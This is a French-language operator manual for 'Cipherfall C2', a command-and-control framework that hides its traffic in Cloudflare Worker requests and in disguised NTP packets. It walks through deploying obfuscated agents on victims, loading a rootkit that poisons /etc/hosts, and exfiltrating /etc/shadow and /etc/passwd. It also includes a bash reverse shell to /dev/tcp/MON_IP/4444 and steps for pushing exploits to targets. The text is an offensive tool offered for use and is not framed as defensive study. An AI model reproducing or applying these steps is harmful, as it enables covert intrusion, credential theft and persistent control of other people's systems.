# Manuel de déploiement — Cipherfall C2

Deux canaux C2 indépendants. Même interface opérateur (`operator_cli.py`).

---

## Vue d'ensemble

```
                    ┌─────────────────────────────────────┐
                    │           OPÉRATEUR                 │
                    │  operator_cli.py / tui.py           │
                    │  (machine locale, pas de port ouvert)│
                    └───────────┬─────────────────────────┘
                                │ admin API (localhost)
                    ┌───────────▼─────────────────────────┐
                    │           SERVEUR C2                │
                    │  cloudflare-worker/server.py        │  ← canal 1
                    │        ou                           │
                    │  ntp/server.py                      │  ← canal 2
                    └───────────┬─────────────────────────┘
                                │
              ┌─────────────────┼───────────────────┐
              │ Canal 1         │                   │ Canal 2
              ▼                 │                   ▼
   ┌─────────────────┐          │        ┌──────────────────┐
   │ Cloudflare KV   │          │        │  UDP/123 ou      │
   │ (dead-drop)     │          │        │  TCP/443         │
   └────────┬────────┘          │        └────────┬─────────┘
            │                   │                 │
            ▼                   │                 ▼
   ┌─────────────────┐          │        ┌──────────────────┐
   │   AGENT         │          │        │   AGENT NTP      │
   │ (victime, HTTP) │          │        │ (victime, UDP)   │
   └─────────────────┘          │        └──────────────────┘
```

| | Canal Cloudflare Worker | Canal NTP |
|---|---|---|
| Transport | HTTPS/443 vers Cloudflare | UDP/123 (fallback TCP/443) |
| Infrastructure | Cloudflare Workers + KV | VPS avec IP publique |
| Détection réseau | Très difficile (trafic HTTPS normal) | NTP légitime (paquets NTS Cookie) |
| Prérequis victime | Accès HTTPS outbound | `/etc/hosts` compromis + UDP/123 outbound |
| Persistance tâches | KV Cloudflare (TTL 1h) | Aucune (UDP fire-and-forget) |

---

## Canal 1 — Cloudflare Worker

### Architecture

```
  OPÉRATEUR                SERVEUR C2               CLOUDFLARE              VICTIME
  (laptop)                 (laptop/VPS)              (Worker KV)             (cible)

  operator_cli.py ──POST──► server.py
                            [pending]
                                │
                                │ PUT /task/{agent_id}
                                ▼
                            server.py ◄──────────────► worker.js
                            [sent]                      KV: task:{id}
                                                            │
                                                            │ GET /task/{id}
                                                            ▼
                                                        nullrelay.py
                                                        [exécute cmd]
                                                            │
                                                            │ PUT /result/{task_id}
                                                            ▼
                            server.py ◄─────────────── worker.js
                            [done]                      KV: result:{id}
                                │
  operator_cli.py ◄──GET──── server.py
  [output affiché]
```

### Étape 1 — Déployer le Worker Cloudflare

```bash
cd Modules/C2/cloudflare-worker

# 1. Installer wrangler
npm install -g wrangler
wrangler login

# 2. Créer le namespace KV
wrangler kv:namespace create "C2_KV"
# → copier l'id retourné dans wrangler.toml :
#   id = "XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"

# 3. Calculer le token partagé (même PSK que le serveur)
python3 -c "
import hashlib, hmac
PSK = 'mon_mot_de_passe_secret'
token = hmac.new(PSK.encode(), b'worker_token', hashlib.sha256).hexdigest()[:32]
print('WORKER_SECRET =', token)
"

# 4. Injecter le secret dans le Worker
wrangler secret put WORKER_SECRET
# → coller la valeur calculée ci-dessus

# 5. Déployer
wrangler deploy
# → noter l'URL : https://cipherfall-c2.XXXX.workers.dev
```

### Étape 2 — Démarrer le serveur C2

```bash
cd Modules/C2/cloudflare-worker
pip install -r requirements.txt

WORKER_URL=https://cipherfall-c2.XXXX.workers.dev \
C2_PSK=mon_mot_de_passe_secret \
python3 server.py

# Sortie attendue :
# [*] C2 server started
# [*] Admin API on http://127.0.0.1:1337
# [*] Polling Worker every 10s
```

> Le serveur n'expose aucun port public. Toute la communication passe par Cloudflare.

### Étape 3 — Préparer et déployer l'agent

```bash
# Récupérer l'ID de l'agent sur la cible
python3 nullrelay.py --id
# → ex: 3685e93ab6597954b51d83969dd4f1ad

# Générer un agent personnalisé via la TUI
cd Modules/C2
WORKER_URL=https://... C2_PSK=... python3 tui.py
# → onglet "Payload" → sélectionner "cloudflare" → remplir WORKER_URL et PSK → "Generate"
# → optionnel : cocher "Obfuscate" pour passer par shadowscript.py

# OU manuellement : éditer les variables en tête de nullrelay.py puis obfusquer
python3 ../../Obfuscator/shadowscript.py nullrelay.py
# → déployer le fichier obfusqué sur la cible
```

### Étape 4 — Opérer

```bash
# Voir les agents connectés
C2_ADMIN_PORTS=1337 python3 ../operator_cli.py agents

# Envoyer une commande (préfixe d'ID = 4 chars min)
python3 ../operator_cli.py task 3685 "id && hostname"

# Attendre et récupérer le résultat
python3 ../operator_cli.py wait <task_id>

# Exfiltrer un fichier
python3 ../operator_cli.py task 3685 "UPLOAD:/etc/shadow"
python3 ../operator_cli.py wait <task_id>
```

---

## Canal 2 — NTP C2

### Architecture

```
                         /etc/hosts (compromis par rootkit)
  0.debian.pool.ntp.org  ──────────────────────► 87.106.187.97
                                                  (VPS C2)

  VICTIME                                          SERVEUR C2
  clockvenom.py                                    ntp/server.py

  1. résoud le domaine NTP                         UDP/123
     → obtient l'IP du VPS (via /etc/hosts)    ┌──────────┐
  2. envoie beacon NTP Mode-3                   │ NTP pkt  │
     ┌──────────────────────────────────────────►  Mode-3  │
     │  NTP header (48B)                        │  + ext   │
     │  + NTS Cookie field (type 0x0104)        └────┬─────┘
     │    └── AES-256-GCM(zlib(JSON beacon))         │
     │                                               │ tâche en attente ?
     │  NTP header (48B)                        ┌────▼─────┐
     └──────────────────────────────────────────┤  NTP pkt │
        + NTS Cookie field (si tâche présente)  │  Mode-4  │
          └── AES-256-GCM(zlib(JSON task))      └──────────┘

  Fallback : si UDP/123 bloqué → TCP/443 (même format, longueur préfixée)
```

### Prérequis

- **VPS** avec IP publique, accès root, UDP/123 et TCP/443 ouverts
- **Rootkit chargé sur la cible** : le rootkit injecte les entrées NTP dans `/etc/hosts`
  et les cache de tout processus sauf l'agent C2 (comm `ntp-agent`)

```
# Vérifier que le rootkit a injecté les entrées (bypass read hook via mmap)
python3 -c "
import mmap
f = open('/etc/hosts', 'rb')
m = mmap.mmap(f.fileno(), 0, prot=mmap.PROT_READ)
print(m[:].decode())
" | grep 87.106
```

### Étape 1 — Démarrer le serveur NTP C2

```bash
# Sur le VPS (nécessite root pour bind UDP/123 et TCP/443)
cd /opt/cipherfall/ntp_c2
pip install -r requirements.txt

C2_PSK=mon_mot_de_passe_secret python3 server.py

# Sortie attendue :
# [*] NTP C2 listening on UDP/123 + TCP/443
# [*] Admin API on http://127.0.0.1:1338

# En arrière-plan :
C2_PSK=... nohup python3 server.py > /var/log/ntp_c2.log 2>&1 &

# Debug (affiche chaque beacon/dispatch) :
C2_PSK=... C2_DEBUG=1 python3 server.py
```

> Port admin par défaut : **1338** (différent du canal Cloudflare : 1337)

### Étape 2 — Déployer l'agent sur la cible

```bash
# Sur la CIBLE — s'assurer que le rootkit est chargé
cd /tmp/rb && insmod ironveil.ko

# Vérifier que le domaine NTP résoud bien vers le VPS
# (en se nommant ntp-agent pour bypasser le filtre du rootkit)
python3 -c "
import socket, ctypes
ctypes.CDLL('libc.so.6').prctl(15, b'ntp-agent', 0, 0, 0)
print(socket.gethostbyname('0.debian.pool.ntp.org'))
"
# doit afficher l'IP du VPS

# Récupérer l'ID agent
python3 /tmp/clockvenom.py --id

# Lancer l'agent (beacon toutes les ~60s ± 30s)
C2_PSK=mon_mot_de_passe_secret python3 /tmp/clockvenom.py

# Intervalle court pour les tests
C2_PSK=... C2_INT=15 C2_JITTER=5 nohup python3 /tmp/clockvenom.py > /tmp/clockvenom.log 2>&1 &
```

### Étape 3 — Opérer

```bash
# Depuis le VPS ou via SSH tunnel vers le VPS
# Port admin NTP C2 = 1338

# Voir les agents
C2_ADMIN_PORTS=1338 python3 operator_cli.py agents

# Envoyer une commande
C2_ADMIN_PORTS=1338 python3 operator_cli.py task 3685 "id && uname -r"

# Attendre le résultat (l'agent doit faire un nouveau beacon)
C2_ADMIN_PORTS=1338 python3 operator_cli.py wait <task_id>
```

---

## Interface opérateur (operator_cli.py)

Fonctionne avec les deux canaux. Changer le port selon le canal.

```
┌─────────────────────────────────────────────────────────────────┐
│  COMMANDE                         DESCRIPTION                   │
├─────────────────────────────────────────────────────────────────┤
│  agents                           liste les agents vus          │
│  tasks                            liste toutes les tâches       │
│  task <id_prefix> <cmd>           envoie une commande           │
│  result <task_id>                 lit le résultat               │
│  wait <task_id>                   attend + affiche le résultat  │
│  register <agent_id> [label]      enregistre un agent           │
└─────────────────────────────────────────────────────────────────┘

Variables d'environnement :
  C2_ADMIN_PORTS=1337        (Cloudflare uniquement)
  C2_ADMIN_PORTS=1338        (NTP uniquement)
  C2_ADMIN_PORTS=1338,1337   (les deux, défaut TUI)
```

Exemples :

```bash
# Exfiltrer /etc/passwd
python3 operator_cli.py task 3685 "UPLOAD:/etc/passwd"
python3 operator_cli.py wait <task_id> | base64 -d

# Reverse shell (listener sur 4444 côté opérateur)
python3 operator_cli.py task 3685 "bash -i >& /dev/tcp/MON_IP/4444 0>&1"
```

---

## TUI — tableau de bord interactif (commun aux deux canaux)

Lance automatiquement sur les deux canaux (lit `.env` dans le même dossier) :

```bash
cd Modules/C2
python3 tui.py
```

Variables `.env` utilisées : `C2_ADMIN_PORTS` (défaut `1338,1337`), `WORKER_URL`, `C2_PSK`, `C2_HOST`.

```
┌──────────────────────────────────────────────────────┐
│  [ Agents ]  [ Graphe ]  [ Payload ]                 │
├──────────────────────────────────────────────────────┤
│  ID           Label        Dernière activité         │
│  3685e93a     debian-vm    il y a 12s   (NTP)        │
│  120ae267     my-laptop    il y a 3 min (CF)         │
├──────────────────────────────────────────────────────┤
│  > commande : _                                      │
└──────────────────────────────────────────────────────┘
  r = refresh   d = supprimer agent   q = quitter
```

L'onglet **Payload** génère un agent personnalisé selon le type choisi :
- **cloudflare** : bake `cloudflare-worker/nullrelay.py` avec `WORKER_URL` et `C2_PSK`
- **ntp** : bake `ntp/clockvenom.py` avec `C2_PSK`, intervalle et jitter (pas de WORKER URL)

Les deux modes supportent l'obfuscation automatique via `shadowscript.py`.

### Commandes spéciales (`/module`)

Saisir dans le champ de commande avec un agent sélectionné.

#### `/module relay [start [port]]`

Ouvre un tunnel TCP de retour vers le C2.

```
/module relay              # démarre le relay sur le port par défaut
/module relay start 8443   # port personnalisé
```

- **Agent CF (NullRelay)** : ouvre un tunnel TCP sur le port spécifié (défaut 443) vers le Worker.
- **Agent NTP (ClockVenom)** : ouvre un listener TCP local sur le port spécifié (défaut 123) qui forward vers `C2_HOST:443`. Supprime la limite de taille UDP/123 pour les commandes suivantes.

#### `/module upload <local_path> [remote_path]`

Envoie un fichier de la machine opérateur vers l'agent.

```
/module upload /tmp/exploit.py                  # → dépose dans /tmp/exploit.py sur la cible
/module upload /tmp/exploit.py /opt/exp.py      # chemin distant personnalisé
```

Mécanisme : lit le fichier localement, base64-encode, envoie `echo '<b64>' | base64 -d > <remote_path>` comme commande shell à l'agent.

Limite pratique : ~quelques MB (plafond CF Workers 100 MB). Pour de gros binaires, démarrer `/module relay` d'abord.

#### `/module download <remote_path> [local_path]`

Récupère un fichier depuis l'agent vers la machine opérateur.

```
/module download /etc/shadow                    # → sauvegardé dans downloads/shadow
/module download /etc/shadow /tmp/shadow.txt    # chemin local personnalisé
```

Le comportement diffère selon le type d'agent :

**Agent CF (NullRelay)** : envoie la commande `UPLOAD:<remote_path>` ; l'agent lit le fichier en binaire et retourne la base64 complète. Pas de limite de taille (plafond CF 100 MB). Un seul aller-retour.

**Agent NTP (ClockVenom)** : protocole en deux phases, automatique et transparent :

```
Phase 1 — count task
  TUI envoie : python3 -c "...gzip.compress(mtime=0)...print(nb_chunks)"
  Agent répond : N  (nombre de chunks nécessaires)

Phase 2 — N chunk tasks
  TUI envoie tâche i : python3 -c "...b64[i*550:(i+1)*550]..."
  Agent répond : 550 chars de base64 gzippé

Réassemblage (boucle de collecte, toutes les 5s) :
  concat → base64decode → gzip.decompress → écriture fichier
```

Débit approximatif (C2_INT=30s) :

| Type de fichier | Chunks (ex. 10 KB) | Temps estimé |
|---|---|---|
| Texte / scripts (ratio gzip ×8) | ~4 | ~2 min |
| Binaires (ratio gzip ×1.3) | ~25 | ~12 min |
| `/etc/passwd` ~2 KB | 2 | ~1 min |

> Pour tout fichier > ~50 KB sur agent NTP : lancer `/module relay` d'abord, puis utiliser `/module download` — le relay supprime la limite UDP et le fichier passe en un seul aller-retour (~30s).

Les tâches de chunks sont visibles dans la liste des tâches. Cliquer sur une tâche chunk affiche sa progression (`chunk X/N, Y reçus`). Le log se met à jour automatiquement quand le téléchargement est terminé.

---

## Checklist de déploiement rapide

### Canal Cloudflare Worker

```
[ ] wrangler deploy (worker.js + secret WORKER_SECRET)
[ ] WORKER_URL noté
[ ] pip install -r cloudflare-worker/requirements.txt
[ ] WORKER_URL=... C2_PSK=... python3 cloudflare-worker/server.py
[ ] Agent baked avec TUI ou manuellement, obfusqué, déployé sur cible
[ ] python3 operator_cli.py agents  → agent visible
```

### Canal NTP

```
[ ] Rootkit chargé sur la cible (insmod ironveil.ko)
[ ] Vérifier injection /etc/hosts via mmap
[ ] VPS : UDP/123 + TCP/443 ouverts dans firewall
[ ] C2_PSK=... python3 ntp/server.py  (sur VPS, root)
[ ] C2_PSK=... C2_INT=15 python3 /tmp/clockvenom.py  (sur cible)
[ ] C2_ADMIN_PORTS=1338 python3 operator_cli.py agents  → agent visible
```

---

## Dépannage

| Symptôme | Cause probable | Correction |
|---|---|---|
| Agent absent de la liste | PSK différent entre agent et serveur | Vérifier `C2_PSK` des deux côtés |
| Tâche reste `sent` | Agent ne beacon pas / tâche perdue | Vérifier que l'agent tourne, re-queue la tâche |
| NTP : agent résoud la vraie IP | Rootkit pas chargé / comm pas `ntp-agent` | `insmod ironveil.ko`, vérifier via mmap |
| NTP : beacon timeout | UDP/123 bloqué ET TCP/443 bloqué | Vérifier firewall VPS et NAT victime |
| NTP : download incomplet / corrompu | Fichier trop grand pour UDP (> ~650B raw) | Utiliser `/module relay` puis relancer `/module download` |
| Cloudflare : 404 sur Worker | WORKER_SECRET incorrect | Recalculer token avec même PSK |
